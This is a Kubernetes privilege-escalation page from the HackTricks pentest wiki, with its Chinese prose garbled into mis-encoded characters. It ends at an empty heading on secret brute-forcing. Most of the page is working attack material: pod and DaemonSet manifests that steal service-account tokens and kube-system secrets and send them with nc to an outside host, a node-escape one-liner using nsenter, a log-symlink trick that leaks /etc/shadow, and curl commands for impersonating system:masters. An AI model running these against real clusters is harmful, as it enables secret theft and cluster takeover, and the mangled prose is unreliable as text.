# åœ¨Kubernetesä¸­æ»¥ç”¨è§’è‰²/é›†ç¾¤è§’è‰²

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€äº›æ½œåœ¨å±é™©çš„è§’è‰²å’Œé›†ç¾¤è§’è‰²é…ç½®ã€‚\
è¯·è®°ä½ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨`kubectl api-resources`è·å–æ‰€æœ‰æ”¯æŒçš„èµ„æºã€‚

## **ç‰¹æƒå‡çº§**

åœ¨Kubernetesä¸­ï¼Œç‰¹æƒå‡çº§æ˜¯æŒ‡ä»¥æ¯”æ‚¨å·²æœ‰çš„æƒé™æ›´é«˜çš„æƒé™ï¼ˆåœ¨Kubernetesé›†ç¾¤å†…éƒ¨æˆ–å¤–éƒ¨äº‘ä¸­ï¼‰è·å¾—å¯¹ä¸åŒä¸»ä½“çš„è®¿é—®æƒé™ã€‚åœ¨Kubernetesä¸­ï¼ŒåŸºæœ¬ä¸Šæœ‰**4ç§ä¸»è¦çš„ç‰¹æƒå‡çº§æŠ€æœ¯**ï¼š

* èƒ½å¤Ÿä»¥æ›´é«˜æƒé™å†’å……å…¶ä»–ç”¨æˆ·/ç»„/æœåŠ¡è´¦æˆ·ï¼ˆSAsï¼‰ï¼Œåœ¨Kubernetesé›†ç¾¤å†…éƒ¨æˆ–å¤–éƒ¨äº‘ä¸­
* èƒ½å¤Ÿåˆ›å»º/ä¿®è¡¥/æ‰§è¡ŒPodï¼Œæ‚¨å¯ä»¥åœ¨å…¶ä¸­æ‰¾åˆ°æˆ–é™„åŠ å…·æœ‰æ›´é«˜æƒé™çš„æœåŠ¡è´¦æˆ·ï¼ˆSAsï¼‰ï¼Œåœ¨Kubernetesé›†ç¾¤å†…éƒ¨æˆ–å¤–éƒ¨äº‘ä¸­
* èƒ½å¤Ÿè¯»å–æœºå¯†ä¿¡æ¯ï¼Œå› ä¸ºæœåŠ¡è´¦æˆ·ï¼ˆSAsï¼‰çš„ä»¤ç‰Œå­˜å‚¨ä¸ºæœºå¯†
* èƒ½å¤Ÿä»å®¹å™¨ä¸­é€ƒé€¸åˆ°èŠ‚ç‚¹ï¼Œæ‚¨å¯ä»¥çªƒå–è¿è¡Œåœ¨èŠ‚ç‚¹ä¸Šçš„æ‰€æœ‰å®¹å™¨çš„æœºå¯†ä¿¡æ¯ã€èŠ‚ç‚¹çš„å‡­æ®ä»¥åŠèŠ‚ç‚¹åœ¨äº‘ä¸­ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰çš„æƒé™
* å€¼å¾—ä¸€æçš„ç¬¬äº”ç§æŠ€æœ¯æ˜¯èƒ½å¤Ÿåœ¨Podä¸­è¿è¡Œç«¯å£è½¬å‘ï¼Œå› ä¸ºæ‚¨å¯èƒ½èƒ½å¤Ÿè®¿é—®è¯¥Podä¸­çš„æœ‰è¶£èµ„æºã€‚

### **è®¿é—®ä»»ä½•èµ„æºæˆ–åŠ¨è¯ï¼ˆé€šé…ç¬¦ï¼‰**

æ­¤æƒé™æä¾›å¯¹**ä»»ä½•èµ„æºçš„ä»»ä½•åŠ¨è¯**çš„è®¿é—®æƒé™ã€‚è¿™æ˜¯ç”¨æˆ·å¯ä»¥è·å¾—çš„æœ€é‡è¦çš„æƒé™ï¼Œç‰¹åˆ«æ˜¯å¦‚æœæ­¤æƒé™ä¹Ÿæ˜¯â€œClusterRoleâ€ã€‚å¦‚æœæ˜¯â€œClusterRoleâ€ï¼Œåˆ™ç”¨æˆ·å¯ä»¥è®¿é—®ä»»ä½•å‘½åç©ºé—´çš„èµ„æºï¼Œå¹¶æ‹¥æœ‰è¯¥æƒé™æ§åˆ¶çš„é›†ç¾¤ã€‚
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### **è®¿é—®ä»»æ„èµ„æº**

ç»™äºˆç”¨æˆ·è®¿é—®ä»»æ„èµ„æºçš„æƒé™å¯èƒ½éå¸¸å±é™©ã€‚ä½†æ˜¯ï¼Œå“ªäº›åŠ¨è¯å…è®¸è®¿é—®è¿™äº›èµ„æºå‘¢ï¼Ÿä»¥ä¸‹æ˜¯ä¸€äº›å±é™©çš„RBACæƒé™ï¼Œå¯èƒ½ä¼šå¯¹æ•´ä¸ªé›†ç¾¤é€ æˆæŸå®³ï¼š

- **resources: \["\*"] verbs: \["create"]** - è¿™ä¸ªæƒé™å¯ä»¥åœ¨é›†ç¾¤ä¸­åˆ›å»ºä»»ä½•èµ„æºï¼Œæ¯”å¦‚podsã€rolesç­‰ã€‚æ”»å‡»è€…å¯èƒ½ä¼šæ»¥ç”¨å®ƒæ¥æå‡æƒé™ã€‚å…³äºè¿™ä¸ªçš„ç¤ºä¾‹å¯ä»¥åœ¨**â€œPodsåˆ›å»ºâ€éƒ¨åˆ†**æ‰¾åˆ°ã€‚
- **resources: \["\*"] verbs: \["list"]** - åˆ—å‡ºä»»ä½•èµ„æºçš„èƒ½åŠ›å¯ä»¥ç”¨æ¥æ³„éœ²å…¶ä»–ç”¨æˆ·çš„ç§˜å¯†ï¼Œå¹¶å¯èƒ½æ›´å®¹æ˜“æå‡æƒé™ã€‚å…³äºè¿™ä¸ªçš„ç¤ºä¾‹å¯ä»¥åœ¨**â€œåˆ—å‡ºç§˜å¯†â€éƒ¨åˆ†**æ‰¾åˆ°ã€‚
- **resources: \["\*"] verbs: \["get"]** - è¿™ä¸ªæƒé™å¯ä»¥ç”¨æ¥ä»å…¶ä»–æœåŠ¡è´¦æˆ·è·å–ç§˜å¯†ã€‚
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### åˆ›å»ºPod - çªƒå–ä»¤ç‰Œ

ä¸€ä¸ªæ‹¥æœ‰åœ¨â€œkube-systemâ€å‘½åç©ºé—´ä¸­åˆ›å»ºpodæƒé™çš„æ”»å‡»è€…å¯ä»¥åˆ›å»ºåŠ å¯†æŒ–çŸ¿å®¹å™¨ã€‚æ­¤å¤–ï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªæ‹¥æœ‰ç‰¹æƒæƒé™çš„**æœåŠ¡è´¦æˆ·ï¼Œé€šè¿‡è¿è¡Œä¸€ä¸ªä½¿ç”¨è¯¥æœåŠ¡çš„podï¼Œå¯ä»¥æ»¥ç”¨æƒé™æ¥å‡çº§ç‰¹æƒ**ã€‚

åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªåä¸º_bootstrap-signer_çš„é»˜è®¤ç‰¹æƒè´¦æˆ·ï¼Œå…·æœ‰åˆ—å‡ºæ‰€æœ‰å¯†é’¥çš„æƒé™ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/rolebinding\_with\_cluster\_admin\_clusterrole-1024x545.png)

æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¶æ„çš„podï¼Œå®ƒå°†ä½¿ç”¨ç‰¹æƒæœåŠ¡ã€‚ç„¶åï¼Œé€šè¿‡æ»¥ç”¨æœåŠ¡ä»¤ç‰Œï¼Œå®ƒå°†çªƒå–å¯†é’¥ï¼š

![](https://www.cyberark.com/wp-content/uploads/2018/12/pods\_yaml\_with\_autoamountServiceAccountToken-1024x345.png)
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
åœ¨ä¸Šä¸€ä¸ªå›¾åƒä¸­ï¼Œè¯·æ³¨æ„_bootstrap-signeræœåŠ¡åœ¨`serviceAccountname`ä¸­çš„ä½¿ç”¨ã€‚

å› æ­¤ï¼Œåªéœ€åˆ›å»ºæ¶æ„çš„podå¹¶æœŸæœ›åœ¨ç«¯å£6666ä¸­è·å–ç§˜å¯†ï¼š

### **åˆ›å»ºå’Œé€ƒé€¸Pod**

ä»¥ä¸‹å®šä¹‰æä¾›äº†å®¹å™¨å¯ä»¥æ‹¥æœ‰çš„æ‰€æœ‰ç‰¹æƒï¼š

* **ç‰¹æƒè®¿é—®**ï¼ˆç¦ç”¨ä¿æŠ¤å¹¶è®¾ç½®èƒ½åŠ›ï¼‰
* **ç¦ç”¨å‘½åç©ºé—´hostIPCå’ŒhostPid**ï¼Œå¯ä»¥å¸®åŠ©æå‡ç‰¹æƒ
* **ç¦ç”¨hostNetwork**å‘½åç©ºé—´ï¼Œæä¾›è®¿é—®çªƒå–èŠ‚ç‚¹äº‘ç‰¹æƒå’Œæ›´å¥½çš„ç½‘ç»œè®¿é—®æƒé™
* **æŒ‚è½½ä¸»æœºçš„/**åˆ°å®¹å™¨ä¸­

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ›å»ºPodï¼š
```bash
kubectl --token $token create -f mount_root.yaml
```
æ¥è‡ª[è¿™æ¡æ¨æ–‡](https://twitter.com/mauilion/status/1129468485480751104)çš„ä¸€å¥è¯ï¼ŒåŠ ä¸Šä¸€äº›è¡¥å……ï¼š
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
ç°åœ¨ä½ å·²ç»èƒ½å¤Ÿé€ƒç¦»èŠ‚ç‚¹ï¼Œå¯ä»¥åœ¨ä»¥ä¸‹é¡µé¢ä¸­æŸ¥çœ‹åæ¸—é€æŠ€æœ¯ï¼š

#### éšè”½æ€§

ä½ å¯èƒ½å¸Œæœ›æ›´åŠ **éšè”½**ï¼Œåœ¨æ¥ä¸‹æ¥çš„é¡µé¢ä¸­ï¼Œä½ å¯ä»¥çœ‹åˆ°å¦‚æœä½ åˆ›å»ºä¸€ä¸ªåªå¯ç”¨äº†ä¹‹å‰æ¨¡æ¿ä¸­æåˆ°çš„æŸäº›æƒé™çš„podï¼Œä½ å°†èƒ½å¤Ÿè®¿é—®åˆ°ä»€ä¹ˆï¼š

* **ç‰¹æƒ + hostPID**
* **ä»…ç‰¹æƒ**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_ä½ å¯ä»¥åœ¨_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) _æ‰¾åˆ°å¦‚ä½•åˆ›å»º/æ»¥ç”¨ä¹‹å‰ç‰¹æƒpodé…ç½®çš„ç¤ºä¾‹_

### åˆ›å»ºPod - è¿ç§»åˆ°äº‘ç«¯

å¦‚æœä½ å¯ä»¥**åˆ›å»º**ä¸€ä¸ª**pod**ï¼ˆå¯é€‰åœ°åˆ›å»ºä¸€ä¸ª**æœåŠ¡è´¦å·**ï¼‰ï¼Œä½ å¯èƒ½èƒ½å¤Ÿé€šè¿‡å°†äº‘è§’è‰²åˆ†é…ç»™podæˆ–æœåŠ¡è´¦å·æ¥åœ¨äº‘ç¯å¢ƒä¸­è·å¾—ç‰¹æƒï¼Œç„¶åè®¿é—®å®ƒã€‚\
æ­¤å¤–ï¼Œå¦‚æœä½ å¯ä»¥åˆ›å»ºä¸€ä¸ª**å…·æœ‰ä¸»æœºç½‘ç»œå‘½åç©ºé—´çš„pod**ï¼Œä½ å¯ä»¥çªƒå–**èŠ‚ç‚¹**å®ä¾‹çš„IAMè§’è‰²ã€‚

äº†è§£æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **åˆ›å»º/ä¿®è¡¥éƒ¨ç½²ã€å®ˆæŠ¤è¿›ç¨‹é›†ã€æœ‰çŠ¶æ€é›†ã€å¤åˆ¶æ§åˆ¶å™¨ã€å‰¯æœ¬é›†ã€ä½œä¸šå’Œå®šæ—¶ä½œä¸š**

éƒ¨ç½²ã€å®ˆæŠ¤è¿›ç¨‹é›†ã€æœ‰çŠ¶æ€é›†ã€å¤åˆ¶æ§åˆ¶å™¨ã€å‰¯æœ¬é›†ã€ä½œä¸šå’Œå®šæ—¶ä½œä¸šéƒ½æ˜¯å…è®¸åœ¨é›†ç¾¤ä¸­åˆ›å»ºä¸åŒä»»åŠ¡çš„ç‰¹æƒã€‚æ­¤å¤–ï¼Œå¯ä»¥ä½¿ç”¨å®ƒä»¬ä¸­çš„ä»»ä½•ä¸€ä¸ªæ¥**å¼€å‘podç”šè‡³åˆ›å»ºpod**ã€‚å› æ­¤ï¼Œå¯ä»¥åƒä¹‹å‰çš„ç¤ºä¾‹ä¸€æ ·**æ»¥ç”¨å®ƒä»¬æ¥æå‡ç‰¹æƒ**ã€‚

å‡è®¾æˆ‘ä»¬æœ‰**åˆ›å»ºå®ˆæŠ¤è¿›ç¨‹é›†çš„æƒé™**ï¼Œæˆ‘ä»¬åˆ›å»ºä»¥ä¸‹YAMLæ–‡ä»¶ã€‚æ­¤YAMLæ–‡ä»¶é…ç½®ä¸ºæ‰§è¡Œæˆ‘ä»¬åœ¨â€œåˆ›å»ºpodâ€éƒ¨åˆ†ä¸­æåˆ°çš„ç›¸åŒæ­¥éª¤ã€‚
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
åœ¨ç¬¬6è¡Œä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°å¯¹è±¡â€œspecâ€å’Œç¬¬10è¡Œä¸­çš„â€œ**template**â€ç­‰å­å¯¹è±¡ã€‚è¿™äº›å¯¹è±¡ä¿å­˜äº†æˆ‘ä»¬å¸Œæœ›å®Œæˆçš„ä»»åŠ¡çš„é…ç½®ã€‚è¿˜è¦æ³¨æ„ç¬¬15è¡Œçš„â€œ**serviceAccountName**â€å’Œç¬¬18è¡Œçš„â€œ**containers**â€å¯¹è±¡ã€‚è¿™éƒ¨åˆ†ä¸åˆ›å»ºæˆ‘ä»¬çš„æ¶æ„å®¹å™¨æœ‰å…³ã€‚

Kubernetes APIæ–‡æ¡£æŒ‡å‡ºï¼Œâ€œ**PodTemplateSpec**â€ç«¯ç‚¹æœ‰åˆ›å»ºå®¹å™¨çš„é€‰é¡¹ã€‚è€Œä¸”ï¼Œæ­£å¦‚æ‚¨æ‰€çœ‹åˆ°çš„ï¼š**deploymentã€daemonsetsã€statefulsetsã€replicationcontrollersã€replicasetsã€jobså’Œcronjobséƒ½å¯ä»¥ç”¨æ¥åˆ›å»ºpods**ï¼š

![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-8.png)

**å› æ­¤ï¼Œåˆ›å»ºæˆ–æ›´æ–°ä»»åŠ¡çš„æƒé™ä¹Ÿå¯ä»¥è¢«æ»¥ç”¨ä»¥è¿›è¡Œé›†ç¾¤ä¸­çš„æƒé™æå‡ã€‚**

### **Pods Exec**

**`pods/exec`**æ˜¯kubernetesä¸­ç”¨äºåœ¨podå†…éƒ¨çš„shellä¸­è¿è¡Œå‘½ä»¤çš„èµ„æºã€‚è¿™ä¸ªæƒé™æ˜¯ä¸ºäº†é‚£äº›æƒ³è¦**è®¿é—®å®¹å™¨å¹¶è¿è¡Œå‘½ä»¤**çš„ç®¡ç†å‘˜è€Œè®¾è®¡çš„ã€‚å®ƒå°±åƒä¸ºå®¹å™¨åˆ›å»ºSSHä¼šè¯ä¸€æ ·ã€‚

å¦‚æœæˆ‘ä»¬æ‹¥æœ‰è¿™ä¸ªæƒé™ï¼Œå®é™…ä¸Šæˆ‘ä»¬å°±èƒ½å¤Ÿ**æ§åˆ¶æ‰€æœ‰çš„pods**ã€‚ä¸ºäº†åšåˆ°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
è¯·æ³¨æ„ï¼Œç”±äºæ‚¨å¯ä»¥è¿›å…¥ä»»ä½• podï¼Œæ‚¨å¯ä»¥åƒåœ¨**Pod åˆ›å»ºåˆ©ç”¨**ä¸­ä¸€æ ·æ»¥ç”¨å…¶ä»– pod çš„ä»¤ç‰Œï¼Œä»¥å°è¯•æå‡æƒé™ã€‚

### ç«¯å£è½¬å‘

æ­¤æƒé™å…è®¸å°†ä¸€ä¸ªæœ¬åœ°ç«¯å£è½¬å‘åˆ°æŒ‡å®š pod ä¸­çš„ä¸€ä¸ªç«¯å£ã€‚è¿™æ—¨åœ¨ä½¿æ‚¨èƒ½å¤Ÿè½»æ¾è°ƒè¯•è¿è¡Œåœ¨ pod å†…éƒ¨çš„åº”ç”¨ç¨‹åºï¼Œä½†æ”»å‡»è€…å¯èƒ½ä¼šæ»¥ç”¨æ­¤æƒé™æ¥è®¿é—® pod å†…éƒ¨çš„æœ‰è¶£ï¼ˆå¦‚æ•°æ®åº“ï¼‰æˆ–æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºï¼ˆå¦‚ç½‘é¡µï¼‰ã€‚
```
kubectl port-forward pod/mypod 5000:5000
```
### **ä¸»æœºå¯å†™ /var/log/ é€ƒé€¸**

æ­£å¦‚[**è¿™é¡¹ç ”ç©¶**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)æ‰€æŒ‡å‡ºçš„é‚£æ ·ï¼Œå¦‚æœæ‚¨å¯ä»¥è®¿é—®æˆ–åˆ›å»ºä¸€ä¸ªæŒ‚è½½äº†**ä¸»æœº`/var/log/`ç›®å½•**çš„Podï¼Œæ‚¨å°±å¯ä»¥**ä»å®¹å™¨ä¸­é€ƒé€¸**å‡ºæ¥ã€‚\
è¿™ä¸»è¦æ˜¯å› ä¸ºå½“**Kube-APIå°è¯•è·å–å®¹å™¨çš„æ—¥å¿—**ï¼ˆä½¿ç”¨`kubectl logs <pod>`ï¼‰æ—¶ï¼Œå®ƒä¼šä½¿ç”¨**Kubelet**æœåŠ¡çš„`/logs/`ç«¯ç‚¹æ¥è¯·æ±‚Podçš„`0.log`æ–‡ä»¶ã€‚\
KubeletæœåŠ¡å…¬å¼€äº†`/logs/`ç«¯ç‚¹ï¼Œå®ƒåŸºæœ¬ä¸Šåªæ˜¯**å…¬å¼€äº†å®¹å™¨çš„`/var/log`æ–‡ä»¶ç³»ç»Ÿ**ã€‚

å› æ­¤ï¼Œä¸€ä¸ªå…·æœ‰**å†™å…¥å®¹å™¨çš„/var/log/æ–‡ä»¶å¤¹çš„æƒé™**çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ä»¥ä¸‹ä¸¤ç§æ–¹å¼æ»¥ç”¨è¿™ç§è¡Œä¸ºï¼š

* ä¿®æ”¹å…¶å®¹å™¨çš„`0.log`æ–‡ä»¶ï¼ˆé€šå¸¸ä½äº`/var/logs/pods/namespace_pod_uid/container/0.log`ï¼‰ï¼Œå°†å…¶è®¾ç½®ä¸ºæŒ‡å‘`/etc/shadow`çš„**ç¬¦å·é“¾æ¥**ã€‚ç„¶åï¼Œæ‚¨å°±å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œæ¥çªƒå–ä¸»æœºçš„shadowæ–‡ä»¶ï¼š
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* å¦‚æœæ”»å‡»è€…æ§åˆ¶ä»»ä½•å…·æœ‰è¯»å– `nodes/log` æƒé™çš„ä¸»ä½“ï¼Œä»–åªéœ€åœ¨ `/host-mounted/var/log/sym` ä¸­åˆ›å»ºä¸€ä¸ªç¬¦å·é“¾æ¥æŒ‡å‘ `/`ï¼Œå½“è®¿é—® `https://<gateway>:10250/logs/sym/` æ—¶ï¼Œä»–å°†åˆ—å‡ºä¸»æœºçš„æ ¹æ–‡ä»¶ç³»ç»Ÿï¼ˆæ›´æ”¹ç¬¦å·é“¾æ¥å¯ä»¥æä¾›å¯¹æ–‡ä»¶çš„è®¿é—®ï¼‰ã€‚
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**å®éªŒå®¤å’Œè‡ªåŠ¨åŒ–åˆ©ç”¨å¯ä»¥åœ¨** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts) **æ‰¾åˆ°**

#### ç»•è¿‡åªè¯»ä¿æŠ¤ <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

å¦‚æœä½ è¶³å¤Ÿå¹¸è¿ï¼Œå¹¶ä¸”é«˜æƒé™çš„ `CAP_SYS_ADMIN` åŠŸèƒ½å¯ç”¨ï¼Œä½ å¯ä»¥å°†æ–‡ä»¶å¤¹é‡æ–°æŒ‚è½½ä¸ºè¯»å†™æ¨¡å¼ï¼š
```bash
mount -o rw,remount /hostlogs/
```
#### ç»•è¿‡ hostPath çš„åªè¯»ä¿æŠ¤ <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

æ­£å¦‚[**è¿™é¡¹ç ”ç©¶**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)æ‰€è¿°ï¼Œå¯ä»¥ç»•è¿‡è¿™ç§ä¿æŠ¤æªæ–½ï¼š
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
è¿™ä¸ªæ–¹æ³•æ—¨åœ¨é˜²æ­¢åƒä¹‹å‰é‚£æ ·çš„é€ƒé€¸ï¼Œè€Œæ˜¯ä½¿ç”¨PersistentVolumeå’ŒPersistentVolumeClaimæ¥æŒ‚è½½å®¹å™¨ä¸­å…·æœ‰å¯å†™è®¿é—®æƒé™çš„ä¸»æœºæ–‡ä»¶å¤¹ï¼Œè€Œä¸æ˜¯ä½¿ç”¨hostPathæŒ‚è½½ã€‚
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **å†’å……ç‰¹æƒè´¦æˆ·**

é€šè¿‡[**ç”¨æˆ·å†’å……**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation)æƒé™ï¼Œæ”»å‡»è€…å¯ä»¥å†’å……ç‰¹æƒè´¦æˆ·ã€‚

åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒæœåŠ¡è´¦æˆ· _**sa-imper**_ ä¸ä¸€ä¸ªå…·æœ‰å…è®¸å†’å……ç»„å’Œç”¨æˆ·çš„è§„åˆ™çš„ ClusterRole ç»‘å®šã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_for\_user\_impersonation.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_for\_user\_impersonation\_2.png)

å¯ä»¥ä½¿ç”¨ `--as=null --as-group=system:master` å±æ€§æ¥**åˆ—å‡ºæ‰€æœ‰çš„å¯†é’¥**ï¼š

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_with\_and\_without\_user\_impersonation-1024x108.png)

**ä¹Ÿå¯ä»¥é€šè¿‡ API REST ç«¯ç‚¹æ‰§è¡Œç›¸åŒçš„æ“ä½œï¼š**
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### **åˆ—å‡ºç§˜å¯†**

**åˆ—å‡ºç§˜å¯†çš„æƒé™**æ˜¯é›†ç¾¤ä¸­éå¸¸å¼ºå¤§çš„èƒ½åŠ›ã€‚æ‹¥æœ‰åˆ—å‡ºç§˜å¯†çš„æƒé™çš„ç”¨æˆ·å¯ä»¥**æ½œåœ¨åœ°æŸ¥çœ‹é›†ç¾¤ä¸­çš„æ‰€æœ‰ç§˜å¯† - åŒ…æ‹¬ç®¡ç†å‘˜å¯†é’¥**ã€‚ç§˜å¯†å¯†é’¥æ˜¯ä»¥base64ç¼–ç çš„JWTä»¤ç‰Œã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_role.png)

æ”»å‡»è€…å¦‚æœåœ¨é›†ç¾¤ä¸­è·å¾—äº†**è®¿é—®\_list secrets**\_çš„æƒé™ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹_curl_å‘½ä»¤è·å–â€œkube-systemâ€å‘½åç©ºé—´ä¸­çš„æ‰€æœ‰ç§˜å¯†ï¼š
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-2.png)

### **è¯»å–ç§˜å¯† - æš´åŠ›ç ´è§£ä»¤ç‰ŒID**

